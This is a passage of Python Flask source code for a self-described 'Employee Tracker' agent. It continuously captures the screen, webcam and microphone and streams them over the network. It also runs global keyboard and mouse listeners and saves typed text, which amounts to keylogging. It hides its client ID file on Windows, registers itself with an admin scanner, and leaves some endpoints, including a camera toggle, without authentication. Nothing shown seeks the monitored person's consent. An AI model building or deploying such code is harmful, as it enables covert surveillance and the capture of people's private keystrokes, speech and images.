        # Prepare sync response
        response_data = {
            "mac_address": get_mac_address(),
            "sync_timestamp": datetime.now().isoformat(),
            "device_stats": get_secure_stats().get_json(),
            "sync_status": "success"
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ============================================================
# ADDITIONAL API ROUTES FOR COMPATIBILITY
# ============================================================

@app.route('/api/tracking/register', methods=['GET'])
def register_endpoint():
    """Endpoint for auto-discovery"""
    return jsonify({
        "server_name": "Enhanced Employee Tracker",
        "status": "active",
        "version": "2.0",
        "mac_address": get_mac_address()
    })

@app.route('/api/tracking/sync', methods=['POST'])
def sync_endpoint():
    """Legacy sync endpoint for compatibility"""
    return secure_sync_endpoint()

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "version": "2.0",
        "uptime": time.time() - psutil.boot_time()
    })

@app.route('/api/maintenance/mode', methods=['POST'])
@require_api_key
def toggle_maintenance_mode():
    """Toggle maintenance mode"""
    global maintenance_mode
    try:
        data = request.get_json()
        enabled = data.get('enabled', False)
        maintenance_mode = enabled
        
        status = "enabled" if maintenance_mode else "disabled"
        print(f"⚠️ Maintenance mode {status}")
        
        return jsonify({
            "success": True,
            "maintenance_mode": maintenance_mode,
            "message": f"Maintenance mode {status}"
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500




# ============================================================
# SCREEN CAPTURE MANAGER (Background Thread)
# ============================================================

import pyaudio
import wave
import mss

# ... existing imports ...

# ============================================================
# OPTIMIZED MICROPHONE MANAGER (Background Audio Thread)
# ============================================================

class MicrophoneManager:
    """
    Background thread-based audio capture manager.
    Captures raw PCM audio efficiently using PyAudio.
    """
    def __init__(self, sample_rate=16000, channels=1, chunk_size=1024):
        self.sample_rate = sample_rate
        self.channels = channels
        self.chunk_size = chunk_size
        self.audio = None
        self.stream = None
        self.lock = threading.Lock()
        self.is_running = False
        self.capture_thread = None
        self.active_clients = 0
        self.chunk_counter = 0
        self.last_chunk = None
        self.last_error = None
        self.last_error_time = None
        self.last_start_time = None
        # Circular buffer for audio chunks (store last ~2 seconds)
        self.audio_buffer = deque(maxlen=int(sample_rate / chunk_size * 2))

    def _set_error(self, message: str):
        self.last_error = message
        self.last_error_time = time.time()

    def get_input_device_summary(self):
        """Return count + default input device info for debugging."""
        summary = {
            "input_device_count": 0,
            "default_input_index": None,
            "default_input_name": None
        }
        try:
            pa = pyaudio.PyAudio()
            device_count = pa.get_device_count()
            input_devices = []
            for idx in range(device_count):
                info = pa.get_device_info_by_index(idx)
                if info.get('maxInputChannels', 0) > 0:
                    input_devices.append(info)
            summary["input_device_count"] = len(input_devices)

            try:
                default_info = pa.get_default_input_device_info()
                summary["default_input_index"] = default_info.get('index')
                summary["default_input_name"] = default_info.get('name')
            except Exception:
                pass
            pa.terminate()
        except Exception as e:
            summary["error"] = str(e)
        return summary

    def start_microphone(self):
        """Initialize microphone if not already running"""
        with self.lock:
            if self.is_running:
                return True

            try:
                self.audio = pyaudio.PyAudio()
                self.stream = self.audio.open(
                    format=pyaudio.paInt16,
                    channels=self.channels,
                    rate=self.sample_rate,
                    input=True,
                    frames_per_buffer=self.chunk_size
                )
                self.is_running = True
                self.capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
                self.capture_thread.start()
                self.last_error = None
                self.last_start_time = time.time()
                print("✓ Microphone initialized successfully (16kHz Mono)")
                return True
            except Exception as e:
                self._set_error(str(e))
                print(f"Microphone initialization error: {e}")
                self._cleanup()
                return False

    def _capture_loop(self):
        """Background loop that captures audio chunks"""
        print("✓ Microphone capture thread started")
        while self.is_running:
            if maintenance_mode:
                time.sleep(1)
                continue

            try:
                # Read raw PCM data
                data = self.stream.read(self.chunk_size, exception_on_overflow=False)
                with self.lock:
                    self.audio_buffer.append(data)
                    self.last_chunk = data
                    self.chunk_counter += 1
            except Exception as e:
                self._set_error(str(e))
                print(f"Audio capture error: {e}")
                time.sleep(0.1)
        
        print("Microphone capture thread stopped")

    def get_audio_stream(self):
        """Generator that yields audio chunks for a client"""
        # Wait for buffer to fill slightly
        while len(self.audio_buffer) == 0 and self.is_running:
            time.sleep(0.1)

        last_seen = -1
        try:
            while self.is_running:
                if maintenance_mode:
                    time.sleep(1)
                    continue

                with self.lock:
                    current_counter = self.chunk_counter
                    if current_counter != last_seen:
                        chunk = self.last_chunk
                        last_seen = current_counter
                    else:
                        chunk = None

                if chunk:
                    yield chunk
                
                # Sleep approx duration of one chunk (1024/16000 = ~0.064s)
                # We sleep slightly less to avoid lag build-up
                time.sleep(0.05)

        except GeneratorExit:
            print("Audio client disconnected")

    def _cleanup(self):
        """Cleanup resources"""
        if self.stream:
            self.stream.stop_stream()
            self.stream.close()
        if self.audio:
            self.audio.terminate()
        self.stream = None
        self.audio = None
        self.is_running = False

    def stop_microphone(self):
        """Stop microphone capture"""
        self.is_running = False
        if self.capture_thread:
            self.capture_thread.join(timeout=1)
        self._cleanup()
        print("✓ Microphone stopped")

# Global Microphone Manager
mic_manager = MicrophoneManager()

# ============================================================
# OPTIMIZED SCREEN CAPTURE MANAGER (Background Thread)
# ============================================================

class ScreenCaptureManager:
    """
    Background thread-based screen capture manager.
    Captures once, streams to many clients.
    OPTIMIZED: Uses mss for high-performance capture.
    """
    def __init__(self, target_fps=5):
        self.latest_frame = None
        self.lock = threading.Lock()
        self.is_running = False
        self.capture_thread = None
        self.target_fps = target_fps
        self.frame_interval = 1.0 / target_fps
        self.sct = None

    def start(self):
        """Start background capture thread"""
        if self.is_running:
            return
        self.is_running = True
        self.capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
        self.capture_thread.start()
        print(f"✓ Screen capture background thread started (Target FPS: {self.target_fps})")

    def stop(self):
        """Stop background capture thread"""
        self.is_running = False
        if self.capture_thread:
            self.capture_thread.join(timeout=2)
        with self.lock:
            self.latest_frame = None
        if self.sct:
            self.sct.close()
            self.sct = None
        print("✓ Screen capture stopped")

    def _capture_loop(self):
        """Background loop that captures screen frames using mss"""
        # Initialize mss in the thread
        with mss.mss() as sct:
            self.sct = sct
            # Get the primary monitor
            monitor = sct.monitors[1]
            
            while self.is_running:
                if maintenance_mode:
                    time.sleep(0.5)
                    continue

                try:
                    start_time = time.time()

                    # Capture using mss (raw pixels) - Extremely Fast
                    sct_img = sct.grab(monitor)
                    
                    # Convert to numpy array (BGRA -> BGR)
                    img = np.array(sct_img)
                    frame_bgr = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    
                    # Resize for performance and bandwidth (1280x720)
                    screen_resized = cv2.resize(frame_bgr, (1280, 720))

                    # Encode to JPEG (Quality 50% for speed/size)
                    ret, buffer = cv2.imencode('.jpg', screen_resized, [cv2.IMWRITE_JPEG_QUALITY, 50])

                    if ret:
                        frame_bytes = buffer.tobytes()
                        with self.lock:
                            self.latest_frame = frame_bytes

                    # Maintain target FPS
                    elapsed = time.time() - start_time
                    sleep_time = max(0, self.frame_interval - elapsed)
                    time.sleep(sleep_time)

                except Exception as e:
                    print(f"Screen capture error: {e}")
                    time.sleep(1)

    def get_frame(self):
        """Get the latest cached frame (thread-safe)"""
        with self.lock:
            return self.latest_frame

# Global Screen Capture Manager
screen_manager = ScreenCaptureManager(target_fps=5) # 5 FPS is enough for monitoring


def generate_screen_stream():
    """Generate screen stream from cached frames (non-blocking)"""
    print("Starting screen stream generator...")
    try:
        while True:
            if maintenance_mode:
                time.sleep(0.5)
                continue
                
            frame = screen_manager.get_frame()
            if frame:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            time.sleep(0.2)  # Client poll rate
    except GeneratorExit:
        print("Screen stream client disconnected")
    except Exception as e:
        print(f"Screen stream error: {e}")


# ============================================================
# ENHANCED CAMERA MANAGER (Background Capture Thread)
# ============================================================

class CameraManager:
    """
    Background thread-based camera capture manager.
    Captures, encodes once, streams to many clients.
    OPTIMIZED: 15 FPS, Quality 60.
    """
    def __init__(self, target_fps=15):
        self.camera = None
        self.lock = threading.Lock()
        self.frame_lock = threading.Lock()
        self.active_clients = 0
        self.is_running = False
        self.is_capturing = False
        self.capture_thread = None
        self.latest_frame_bytes = None
        self.target_fps = target_fps
        self.frame_interval = 1.0 / target_fps

    # ... (rest of CameraManager remains mostly same, ensuring init uses FPS 15) ...
    def start_camera(self):
        """Initialize camera if not already running"""
        with self.lock:
            if self.is_running and self.camera and self.camera.isOpened():
                return True

            try:
                # Try index 0 first, then 1
                for idx in [0, 1]:
                    self.camera = cv2.VideoCapture(idx, cv2.CAP_DSHOW)  # DirectShow for Windows
                    if self.camera.isOpened():
                        break

                if self.camera and self.camera.isOpened():
                    self.camera.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                    self.camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                    self.camera.set(cv2.CAP_PROP_FPS, self.target_fps)
                    self.camera.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # Minimize buffer lag
                    self.is_running = True
                    
                    # Start background capture thread
                    self._start_capture_thread()
                    
                    print(f"✓ Camera initialized successfully (Target FPS: {self.target_fps})")
                    return True
                else:
                    print("Failed to open camera")
                    return False
            except Exception as e:
                print(f"Camera initialization error: {e}")
                return False

    def _start_capture_thread(self):
        """Start the background capture thread"""
        if self.is_capturing:
            return
        self.is_capturing = True
        self.capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
        self.capture_thread.start()
        print("✓ Camera capture thread started")

    def _capture_loop(self):
        """Background loop that captures camera frames"""
        while self.is_capturing and self.is_running:
            if maintenance_mode:
                time.sleep(0.1)
                continue

            try:
                start_time = time.time()

                # Read frame from camera
                with self.lock:
                    if self.camera and self.camera.isOpened():
                        ret, frame = self.camera.read()
                    else:
                        ret = False
                        frame = None

                if ret and frame is not None:
                    # Encode to JPEG (Quality 60 for speed)
                    ret_enc, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
                    if ret_enc:
                        with self.frame_lock:
                            self.latest_frame_bytes = buffer.tobytes()

                # Maintain target FPS
                elapsed = time.time() - start_time
                sleep_time = max(0, self.frame_interval - elapsed)
                time.sleep(sleep_time)

            except Exception as e:
                print(f"Camera capture error: {e}")
                time.sleep(0.1)

        print("Camera capture thread stopped")

    def get_latest_frame(self):
        """Get the latest cached frame bytes (thread-safe, non-blocking)"""
        with self.frame_lock:
            return self.latest_frame_bytes

    def add_client(self):
        """Register a new streaming client"""
        with self.lock:
            self.active_clients += 1
            print(f"Client added. Active clients: {self.active_clients}")
            
            if not self.is_running:
                # Need to release lock before calling start_camera
                pass
        
        # Start camera if not running (outside lock to avoid deadlock)
        if not self.is_running:
            success = self.start_camera()
            if not success:
                with self.lock:
                    self.active_clients -= 1
                return False
        return True

    def remove_client(self):
        """Unregister a streaming client"""
        with self.lock:
            self.active_clients -= 1
            print(f"Client removed. Active clients: {self.active_clients}")
            if self.active_clients <= 0:
                self.active_clients = 0
                self._stop_internal()

    def force_stop(self):
        """Force stop the camera (admin toggle)"""
        with self.lock:
            self.active_clients = 0
            self._stop_internal()

    def _stop_internal(self):
        """Internal helper to release camera"""
        self.is_capturing = False
        if self.capture_thread:
            self.capture_thread.join(timeout=1)
            self.capture_thread = None
        
        if self.camera:
            self.camera.release()
            self.camera = None
        self.is_running = False
        
        with self.frame_lock:
            self.latest_frame_bytes = None
        print("✓ Camera released")

    def is_active(self):
        """Check if camera is active"""
        with self.lock:
            return self.is_running


# Global Camera Manager instance (15 FPS DEFAULT)
camera_manager = CameraManager(target_fps=15)


def generate_camera_stream():
    """Generate camera stream from cached frames (non-blocking)"""
    print("Starting camera stream generator...")

    # Register client
    if not camera_manager.add_client():
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + b'' + b'\r\n')
        return

    try:
        while camera_manager.is_active():
            if maintenance_mode:
                time.sleep(0.5)
                continue
                
            frame = camera_manager.get_latest_frame()

            if frame:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            
            time.sleep(0.033)  # ~30 FPS output

    except GeneratorExit:
        print("Camera stream client disconnected")
    except Exception as e:
        print(f"Camera stream error: {e}")
    finally:
        print("Client disconnected, removing from manager")
        camera_manager.remove_client()


# API Routes
@app.route('/stream', methods=['GET'])
@require_api_key
def stream_screen():
    """Stream screen capture"""
    return Response(generate_screen_stream(),
                   mimetype='multipart/x-mixed-replace; boundary=frame')


@app.route('/start_camera', methods=['GET'])
@require_api_key
def start_camera():
    """Start camera stream"""
    return Response(generate_camera_stream(),
                   mimetype='multipart/x-mixed-replace; boundary=frame')


@app.route('/stop_camera', methods=['GET'])
@require_api_key
def stop_camera():
    """Stop camera stream"""
    camera_manager.force_stop()
    return jsonify({"message": "Camera stream stopped"})


@app.route('/camera_status', methods=['GET'])
@require_api_key

def camera_status():
    """Get camera status"""
    is_active = camera_manager.is_active()
    return jsonify({
        "active": is_active,
        "clients": camera_manager.active_clients,
        "message": "Camera is active" if is_active else "Camera is inactive"
    })

# ============================================================
# AUDIO STREAMING ENDPOINTS
# ============================================================

@app.route('/audio_stream.wav', methods=['GET'])
@require_api_key
def stream_audio():
    """Stream microphone audio as WAV/PCM"""
    def audio_gen():
        # WAV Header for 16kHz, 16-bit, Mono (PCM)
        # We can send raw PCM if the client expects it, OR use a simple WAV header
        # For simplicity in this agent: Raw PCM stream logic suited for modern browsers/tools
        
        # Start microphone if needed
        if not mic_manager.start_microphone():
            return
            
        try:
            for chunk in mic_manager.get_audio_stream():
                yield chunk
        except Exception:
            pass

    # Use a raw PCM mime type or wav. Browser support varies. 
    # 'audio/x-raw; rate=16000; channels=1; format=s16le' is explicit
    return Response(audio_gen(), mimetype='audio/x-raw; rate=16000; channels=1; format=s16le')

@app.route('/mic_status', methods=['GET'])
@require_api_key
def mic_status():
    """Get microphone status"""
    return jsonify({
        "active": mic_manager.is_running,
        "sample_rate": mic_manager.sample_rate,
        "message": "Microphone is active" if mic_manager.is_running else "Microphone is inactive",
        "last_error": mic_manager.last_error,
        "last_error_time": datetime.fromtimestamp(mic_manager.last_error_time).isoformat() if mic_manager.last_error_time else None,
        "last_start_time": datetime.fromtimestamp(mic_manager.last_start_time).isoformat() if mic_manager.last_start_time else None,
        "input_devices": mic_manager.get_input_device_summary()
    })

@app.route('/stop_mic', methods=['GET'])
@require_api_key
def stop_mic():
    """Stop microphone capture"""
    mic_manager.stop_microphone()
    return jsonify({"message": "Microphone stopped"})



def get_persistent_client_id():
    """
    Get or create a persistent unique client ID.
    Stored in client_id.txt to survive restarts and IP changes.
    """
    client_id_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'client_id.txt')
    try:
        if os.path.exists(client_id_file):
            with open(client_id_file, 'r') as f:
                client_id = f.read().strip()
                if client_id:
                    return client_id
    except Exception as e:
        print(f"Error reading client_id: {e}")

    # Generate new ID if missing or empty
    new_id = str(uuid.uuid4())
    try:
        with open(client_id_file, 'w') as f:
            f.write(new_id)
        # Apply hidden attribute on Windows
        if platform.system() == "Windows":
             import ctypes
             FILE_ATTRIBUTE_HIDDEN = 0x02
             ctypes.windll.kernel32.SetFileAttributesW(client_id_file, FILE_ATTRIBUTE_HIDDEN)
    except Exception as e:
        print(f"Error saving client_id: {e}")
    
    return new_id

@app.route('/api/secure/stats', methods=['GET'])
@require_api_key
def get_secure_stats_endpoint():
    """Get secure live statistics"""
    return get_live_stats()

@app.route('/api/identity', methods=['GET'])
def get_identity():
    """
    Public identity endpoint for auto-discovery.
    Allows the admin scanner to identify this device as a Tactical Agent.
    """
    try:
        return jsonify({
            "hostname": get_exact_hostname(),
            "mac_address": get_mac_address(),
            "unique_client_id": get_persistent_client_id(),
            "os": f"{platform.system()} {platform.release()}",
            "agent_version": "2.2",
            "type": "Tactical Agent",
            "status": "active"
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def toggle_camera_state():
    """Toggle camera state (helper for toggle button)"""
    if camera_manager.is_active():
        camera_manager.force_stop()
        return {"status": "stopped", "active": False, "message": "Camera stopped"}
    else:
        # Pre-initialize camera to ensure it works
        success = camera_manager.start_camera()
        return {
            "status": "started", 
            "active": True, 
            "init_success": success,
            "message": "Camera started" if success else "Failed to start camera"
        }

@app.route('/toggle_camera', methods=['GET', 'POST'])
def toggle_camera_route():
    """Toggle camera endpoint"""
    result = toggle_camera_state()
    return jsonify(result)


# ============================================================
# INITIALIZATION
# ============================================================

def initialize_enhanced_tracker():
    """Initialize enhanced tracking system"""
    print("🚀 INITIALIZING ENHANCED TRACKING SYSTEM")
    print("=" * 60)
    
    # Initialize secure database
    init_secure_database()
    
    # Load previous daily stats
    load_daily_stats()
    
    # Register device
    register_or_update_employee()
    
    # Start enhanced input listeners
    start_enhanced_listeners()
    
    # Start activity tracker
    threading.Thread(target=enhanced_activity_tracker, daemon=True).start()
    
    # Start Explicit Interval Monitor (New Loop)
    threading.Thread(target=explicit_interval_monitor, daemon=True).start()
    
    # Start Explicit Interval Monitor (New Loop)
    threading.Thread(target=explicit_interval_monitor, daemon=True).start()
    
    # Start background screen capture thread
    screen_manager.start()
    
    # Start auto-discovery service
    discovery_service = AutoDiscoveryService()
    discovery_service.start_auto_sync()
    
    print("✓ Enhanced tracking system initialized")
    print("✓ Screen capture background thread active")
    print("✓ Auto-sync service started (30min intervals)")
    print("✓ Secure encryption enabled")
    print("✓ Application usage tracking active")
    print(f"📡 Service running on: http://{get_local_ip()}:5002")
    print("=" * 60)

def enhanced_activity_tracker():
    """Enhanced background activity tracker"""
    last_loop_time = time.time()
    while True:
        if maintenance_mode:
            time.sleep(1)
            last_loop_time = time.time() # Reset delta
            continue
            
        current_time = time.time()
        delta = current_time - last_loop_time
        last_loop_time = current_time
        
        update_enhanced_activity_times(delta)
        time.sleep(1)

def explicit_interval_monitor():
    """
    Explicit scheduling loop for metrics collection.
    Prevents drift and manages different collection intervals.
    """
    next_core = 0
    next_net = 0
    next_proc = 0
    
    CORE_INTERVAL = 0.5    # CPU/RAM every 0.5s (High speed)
    NET_INTERVAL = 1.0     # Network/Window every 1s
    PROCESS_INTERVAL = 10   # Top processes every 10s
    
    print("✓ Started explicit interval monitor")
    
    while True:
        try:
            now = time.time()
            
            # 1. Core Metrics (High Frequency)
            if now >= next_core:
                metrics = core_monitor.get_core_metrics()
                with current_stats_lock:
                    current_secure_stats['core'] = metrics
                next_core = now + CORE_INTERVAL
                
            # 2. Network Metrics (Medium Frequency)
            # Note: underlying psutil diff needs time to pass, handled by module
            if ENABLE_NET_MONITOR and now >= next_net:
                net_metrics = network_monitor.get_network_metrics()
                with current_stats_lock:
                    current_secure_stats['network'] = net_metrics
                next_net = now + NET_INTERVAL
                
            # 3. Top Processes (Low Frequency)
            if ENABLE_TOP_PROCESSES and now >= next_proc:
                procs = process_monitor.get_top_processes(limit=3)
                with current_stats_lock:
                    current_secure_stats['top_processes'] = procs
                next_proc = now + PROCESS_INTERVAL
                
            # 4. Window Title (Medium Frequency - e.g. 5s)
            # Can share NET_INTERVAL or have its own
            if ENABLE_WINDOW_TITLES and now >= next_net: 
                window = window_monitor.get_active_window(enabled=True)
                with current_stats_lock:
                    current_secure_stats['window'] = window
            
            time.sleep(0.5) # Resolution sleep
            
        except Exception as e:
            print(f"Interval monitor error: {e}")
            time.sleep(5)

def start_enhanced_listeners():
    """Start enhanced input listeners"""
    def start_keyboard():
        with keyboard.Listener(on_press=on_key_press_enhanced) as listener:
            listener.join()
    
    def start_mouse():
        with mouse.Listener(on_move=on_move_enhanced, on_click=on_click_enhanced) as listener:
            listener.join()
    
    threading.Thread(target=start_keyboard, daemon=True).start()
    threading.Thread(target=start_mouse, daemon=True).start()


# Global lock file handle
_lock_file = None

def ensure_single_instance():
    """
    Ensure only one instance of the service is running using file locking.
    Uses msvcrt on Windows to acquire a non-blocking lock.
    """
    global _lock_file
    import sys
    import os
    
    lock_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'service.lock')
    
    try:
        if os.path.exists(lock_path):
            try:
                os.remove(lock_path)
            except:
                pass # active instance might hold it
                
        _lock_file = open(lock_path, 'w')
        
        try:
            import msvcrt
            msvcrt.locking(_lock_file.fileno(), msvcrt.LK_NBLCK, 1)
            # Write PID
            _lock_file.write(str(os.getpid()))
            _lock_file.flush()
        except ImportError:
            # Fallback for non-Windows (fcntl)
            import fcntl
            fcntl.lockf(_lock_file, fcntl.LOCK_EX | fcntl.LOCK_NB)
            _lock_file.write(str(os.getpid()))
            _lock_file.flush()
            
    except IOError:
        print("\n\n❌ ERROR: Another instance of service.py is already running!")
        print(f"Check {lock_path} or use task manager to kill python processes.")
        sys.exit(1)
    except Exception as e:
        print(f"Warning: Could not acquire lock: {e}")

if __name__ == '__main__':
    ensure_single_instance()
    initialize_enhanced_tracker()
    
    try:
        app.run(host='0.0.0.0', port=5002, debug=False, use_reloader=False)
    except KeyboardInterrupt:
        print("\n\n🛑 Shutting down enhanced tracker...")
        # Final data save
        save_daily_summary_enhanced()
        save_encrypted_typed_text()
        system_monitor.save_application_usage()
        print("✓ All data securely saved")
